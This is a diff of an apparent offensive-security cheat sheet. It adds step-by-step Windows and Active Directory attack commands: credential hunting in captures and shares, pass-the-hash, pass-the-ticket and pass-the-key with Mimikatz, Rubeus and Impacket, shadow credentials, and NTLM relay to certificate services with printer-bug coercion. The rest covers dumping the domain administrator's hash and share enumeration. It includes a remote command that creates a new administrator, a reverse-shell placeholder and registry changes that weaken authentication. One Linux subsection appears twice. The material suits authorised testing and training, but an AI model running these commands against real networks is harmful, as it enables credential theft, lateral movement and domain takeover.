-# Manually generate keywords or use cewl via OSINT
-cat << EOF > keywords.txt
-<KEYWORDS>
-EOF
+# Pcreds tool
+git clone https://github.com/lgandx/PCredz.git
+docker build . -t pcredz
+docker run --net=host -v $(pwd):/opt/Pcredz -it pcredz
 
-# c - Capitalize the first character, lowercase the rest
-# C - Lowercase the first character, uppercase the rest
-# t - Toggle the case of all characters in a word
-# $! - Appends the character ! to the end 
-# $1$9$9$8 - Appends '1998' to the end
-# $1$9$9$8$! - Appends '1998!' to the end
-# sa@ - Replace all instances of a with @
-# so0 - Replace all instances of o with 0
-# ss$ - Replace all instances of s with $
-cat << EOF > custom.rule
-c
-C
-t                                                                \$!
-\$1\$9\$9\$8
-\$1\$9\$9\$8\$!
-sa@
-so0
-ss\$
-EOF
+python3 ./Pcredz -f *.pcapng
 
-# Generate permutated wordlist
-hashcat --force -r custom.rule keywords.txt  --stdout | sort -u > wordlist.txt
+---
 
-# Crack hash
-hashcat -a 0 -m <HASH_ID> -r custom.rule <HASH> wordlist.txt
+# Wireshark
+frame matches "(?i)passw|user|token|key|secret|num"
+```
+
+### Creds in Shares
+
+Can use a `<PATTERN>` like "passw"
+
+```bash
+# https://github.com/SnaffCon/Snaffler
+wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.224/Snaffler.exe
+
+.\Snaffler.exe -s -o snaffler.txt
+Snaffler.exe -s -u
+
+# https://github.com/NetSPI/PowerHuntShares
+wget https://github.com/NetSPI/PowerHuntShares/raw/refs/heads/main/PowerHuntShares.psm1
+
+Set-ExecutionPolicy -Scope Process Bypass
+Import-Module .\PowerHuntShares.psm1
+Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
+
+# https://github.com/blacklanternsecurity/MANSPIDER
+git clone https://github.com/blacklanternsecurity/MANSPIDER.git && cd MANSPIDER
+docker run --rm -v ./manspider:/root/.manspider blacklanternsecurity/manspider <TARGET> -c '<PATTERN>' -u '<USER>' -p '<PASSWORD>'
+
+# Search for string
+netexec smb <TARGET> -u <USER> -p '<PASSWORD>' --spider <SHARE> --content --pattern "<PATTERN>"
+
+# Search
+Get-ChildItem -Recurse -Include *.* \\<HOSTNAME>\<SHARE> | Select-String -Pattern "<PATTERN>"
+```
+
+### Pass the Hash (PtH)
+
+**Enumeration**
+```bash
+# Get Domain Info
+net config workstation
+ipconfig /all
+echo %USERDOMAIN%
+echo %LOGONSERVER%
+(Get-WmiObject Win32_ComputerSystem).Domain
+systeminfo | findstr /i domain
+```
+
+**Preparation (Local Accounts)**
+```bash
+# Enable Registry Key to PtH for non-RID-500 local admins
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
+```
+
+**Mimikatz (Interactive)**
+```bash
+# Use "." for domain if targeting local machine
+# IMPORTANT: Run commands inside the NEW window that pops up
+mimikatz.exe "privilege::debug" "sekurlsa::pth /user:<USER> /ntlm:<PASS_HASH> /domain:<DOMAIN> /run:cmd.exe" exit
+```
+
+**Invoke-TheHash (PowerShell)**
+```bash
+Import-Module .\Invoke-TheHash.psd1
+
+# SMB w/ add Admin user payload
+Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <PASS_HASH> -Command "net user <NEW_USER> <NEW_PASS> /add && net localgroup administrators <NEW_USER> /add" -Verbose
+
+# WMI w/ PowerShell reverse shell payload
+Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USER> -Hash <PASS_HASH> -Command "<REV_SHELL_POWERSHELL_PAYLOAD>"
+```
+
+**Impacket (Python)**
+```bash
+# NOTE: Use forward slash for domain syntax to avoid shell escaping
+# :<PASS_HASH> implies empty LM hash (LM:NT)
+
+impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes :<PASS_HASH>
+impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes :<PASS_HASH>
+impacket-atexec <DOMAIN>/<USER>@<TARGET> -hashes :<PASS_HASH>
+impacket-smbexec <DOMAIN>/<USER>@<TARGET> -hashes :<PASS_HASH>
+```
+
+**NetExec (Enumeration/Spraying)**
+```bash
+# Target can also be a subnet (CIDR)
+# -d . = Local Account | -d <DOMAIN> = Domain Account
+# --local-auth forces local check if implied domain fails
+netexec smb <TARGET> -u <USER> -d . -H <PASS_HASH> --local-auth
+```
+
+**Evil-WinRM (WinRM Shell)**
+```bash
+# Most reliable shell if ports 5985/5986 are open
+evil-winrm -i <TARGET> -u <USER> -H <PASS_HASH>
+```
+
+**RDP (Restricted Admin Mode)**
+```bash
+#Enable Restricted Admin on Target (Requires Admin rights)
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+xfreerdp3 /v:<TARGET> /u:<USER> /pth:<PASS_HASH> /cert:ignore +clipboard /dynamic-resolution /drive:/usr/share/windows-resources/mimikatz/x64,share
+```
+
+### Pass the Ticket (PtT)
+
+#### Windows
+
+**Mimikatz**
+```bash
+# 1. Export tickets from memory to .kirbi files
+.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" exit
+# $ : machine tickets (computers)
+# @ : service tickets (users)
+
+# 2. Inject Ticket
+.\mimikatz.exe "kerberos::ptt <TICKET_FILE.kirbi>" "misc::cmd" exit
+```
+
+**Rubeus**
+```bash
+# Enumerate tickets currently in session
+.\Rubeus.exe triage
+
+# Export tickets to base64 (for copy-paste)
+.\Rubeus.exe dump /nowrap
+
+# Pass from File
+.\Rubeus.exe ptt /ticket:"<TICKET_FILE.kirbi>"
+
+# Pass from Base64 String
+.\Rubeus.exe ptt /ticket:"<BASE64_STRING>"
+
+# Convert File to Base64 (PowerShell Helper)
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("<TICKET_FILE.kirbi>"))
+
+# Advanced: Extract & Pass John's ticket automatically (Regex One-Liner)
+$raw = .\Rubeus.exe dump /user:john /nowrap | Out-String
+$ticket = [Regex]::Match($raw, "(?s)Base64EncodedTicket\s*:\s*(.*)").Groups[1].Value.Trim() -replace "\s", ""
+.\Rubeus.exe ptt /ticket:$ticket
+```
+
+#### Linux
+
+- Cache: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
+    - Check `$KRB5CCNAME`
+        - Stored in `/tmp`
+- Keytabs: https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
+    - `/etc/krb5.keytab`
+
+```bash
+klist
+# Backup current keytab
+cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) KEYTAB.BAK
+# Use current keytab
+export KRB5CCNAME=KEYTAB.BAK
+```
+
+#### Linux
+
+- Cache: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
+    - Check `$KRB5CCNAME`
+        - Stored in `/tmp`
+- Keytabs: https://servicenow.iu.edu/kb?sys_kb_id=2c10b87f476456583d373803846d4345&id=kb_article_view#intro
+    - Machine: `/etc/krb5.keytab`
+
+```bash
+# Enumerate AD information
+# https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/cmd-realmd
+realm list
+
+# Check for AD
+grep -i "sss\|winbind\|ldap" /etc/nsswitch.conf
+ps -ef | grep -i "winbind\|sssd"
+env | grep -i krb5
+
+# Find keytabs
+sudo find / \( -iname '*keytab*' -o -iname '*.kt' \) -ls 2>/dev/null
+
+# List cached Kerberos tickets
+klist
+# Backup current keytab
+cp -v $(echo $KRB5CCNAME | cut -d ':' -f 2) current.kt.bak
+# Use current keytab
+export KRB5CCNAME=$(pwd)/current.kt.bak
+
+# Extract hashes from keytab files
+# https://github.com/sosdave/KeyTabExtract
+python3 keytabextract.py <KEYTAB_FILE>
+
+# Use keytab
+# NOTE: not all cached keytabs are valid
+ls -la /tmp/krb5cc*
+cp -v <KEYTAB> $HOME/current.kt.bak
+export KRB5CCNAME=$HOME/current.kt.bak
+
+# Show keytabs
+klist
+# Use keytab
+kinit -k '<NAME>'
+
+smbclient //<TARGET>/C$ -k -no-pass -c 'ls'
+```
+
+### Pass the Key (PtK) / OverPass the Hash (OtH)
+
+*Concept: Request a Kerberos Ticket (TGT) using an NTLM hash or AES Key, rather than using the NTLM protocol directly.*
+
+**Preparation**
+```bash
+# Extract AES Keys
+.\mimikatz.exe "privilege::debug" "sekurlsa::ekeys" exit
+```
+
+**Option A: Mimikatz (Process Injection)**
+```bash
+# Spawns a process. Windows will implicitly request TGT using the injected key/hash when network resources are accessed.
+# Can use /ntlm, /aes128, or /aes256
+sekurlsa::pth /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY> /run:cmd.exe
+```
+
+**Option B: Rubeus (Request & Inject)**
+```bash
+# Requests a TGT from the KDC and immediately injects it (/ptt)
+# Can use /rc4 (NTLM), /aes128, or /aes256
+.\Rubeus.exe asktgt /ptt /domain:<DOMAIN> /user:<USER> /aes256:<AES256_KEY>
+```
+
+### Pass the Certificate (PtC)
+
+**Shadow Credentials Attack:**
+```bash
+# https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/
+# https://github.com/ShutdownRepo/pywhisker.git
+git clone https://github.com/ShutdownRepo/pywhisker.git && cd pywhisker && pip3 install -r requirements.txt && cd pywhisker
+
+# Get Certificate for user
+python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --target <NEW_USER> --action add
+# creates .pfx file of <NEW_USER> and PFX password
+```
+
+```bash
+# Intercept web enrollment requests
+# https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py
+# NOTE: use https://github.com/ly4k/Certipy to find other templates
+python3 -m venv venv
+pip install git+https://github.com/fortra/impacket.git
+hash -r
+venv/bin/ntlmrelayx.py --adcs -smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
+# outputs *.pfx file
+
+# Force arbitrary auth from <TARGET> to <ATTACKER> via printers
+# e.g. DC => ATTACKER BOX
+# https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py
+wget https://github.com/dirkjanm/krbrelayx/raw/refs/heads/master/printerbug.py
+python3 printerbug.py <DOMAIN>/<USERNAME>:"<PASSWORD>"@<TARGET> <ATTACKER>
+
+# PtC to get TGT
+# https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py
+git clone https://github.com/dirkjanm/PKINITtools.git ; cd PKINITtools ; python3 -m venv .venv ; source .venv/bin/activate ; pip3 install -r requirements.txt ; pip3 install -I git+https://github.com/wbond/oscrypto.git
+
+# OPTIONAL: -pfx-pass from pywhisker.py
+python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASS> -dc-ip <DC_IP> '<DOMAIN>/<USER>' <OUTPUT_TGT>
+# gives <OUTPUT_TGT>
+
+---
+
+# Configure Kerberos
+echo '<DC_IP> <DC_FQDN>' | sudo tee -a /etc/hosts
+sudo cp -v /etc/krb5.conf /etc/krb5.conf.bak
+echo '[libdefaults]
+    default_realm = <DOMAIN>
+    dns_lookup_kdc = false
+[realms]
+    INLANEFREIGHT.LOCAL = {
+        kdc = <DC_FQDN>
+    }
+[domain_realm]
+    .<DOMAIN_LOWER> = <DOMAIN_UPPER>
+    <DOMAIN_LOWER> = <DOMAIN_UPPER>
+' | sudo tee /etc/krb5.conf
+
+export KRB5CCNAME=<OUTPUT_TGT>
+klist
+# Get NTLM hash of DC Administrator
+impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DOMAIN>/<DC_HOSTNAME>$'@<TARGET_FQDN>
+# gives HASH
+
+evil-winrm ... -H <HASH>
+```
+
+### PowerShell Remoting
+
+*Requires valid Kerberos Ticket (PtT) or active NTLM Injection (PtH) in the current session.*
+
+**Ports**
+*   TCP/5985 (HTTP)
+*   TCP/5986 (HTTPS)
+
+**Requirements**
+*   Administrative permissions OR
+*   Member of "Remote Management Users" OR
+*   Explicit PSSession configuration
+
+**Command**
+```bash
+Enter-PSSession -ComputerName <TARGET_HOSTNAME>
 ```
 
 ## ⬆️ Privilege Escalation (PrivEsc)
@@ -2059,11 +2610,66 @@ f="<FILE>" ; cat $f | tr -c '[:print:]\t\n' '[\n*]' | awk 'length > 3' | less
 
 # string replacement
 f="<FILE>" ; sed 's/[^[:print:]]/\n/g' $f | awk 'length > 3' | less
+
+---
+
+# Map drive
+sudo apt install -y cifs-utils
+sudo mkdir /mnt/<SHARE>
+sudo mount -t cifs -o username=<USERNAME>,password=<PASSWORD>,domain=. //<TARGET>/<SHARE> /mnt/<SHARE>
+sudo mount -t cifs -o credentials=credentialfile //<TARGET>/<SHARE> /mnt/<SHARE>
+# credentialfile
+username=<USERNAME>
+password=<PASSWORD>
+domain=.
+
+# Search filenames
+find <PATH> -name *<KEYWORD>*
+
+# Search keyword in files
+grep -rn <PATH> -ie <KEYWORD>
 ```
 
 ```powershell
 # Get PS Version
 $PSversiontable
+
+---
+
+# Current User Info
+whoami
+whoami /priv          # Show current user's privileges
+whoami /groups        # Show current user's group memberships
+
+# List Users & Groups
+net user              # List all local users
+net localgroup        # List all local groups
+net localgroup | findstr admin
+net localgroup "<GROUP>"
+net localgroup administrators  # List members of the Administrators group
+
+# Password & Account Policy
+net accounts          # (Local policy)
+net accounts /domain  # (Domain policy)
+
+# Map drive
+net use <DRIVE>: \\<TARGET>\<SHARE>
+net use <DRIVE>: \\<TARGET>\<SHARE> /user:<USER> <PASSWORD>
+
+# Map drive
+New-PSDrive -PSProvider "FileSystem" -Name "<DRIVE>" -Root "\\<TARGET>\<SHARE>"
+$secpassword = ConvertTo-SecureString -AsPlainText -Force '<PASSWORD>'
+$cred = New-Object System.Management.Automation.PSCredential '<USERNAME>', $secpassword
+New-PSDrive -PSProvider "FileSystem" -Credential $cred -Name "<DRIVE>" -Root "\\<TARGET>\<SHARE>"
+
+# Search filenames
+dir /s /b <DRIVE>:\*<KEYWORD>*
+Get-ChildItem -Recurse -File -Path <DRIVE>:\ -Include *<KEYWORD>*
+
+# Search keyword in files
+findstr /s /i <KEYWORD> <DRIVE>:\*.*
+Get-ChildItem -Recurse -Path <DRIVE>:\ | Select-String -List "<KEYWORD>"
+
 ```
 ## 🚪 Backdoor Access
 
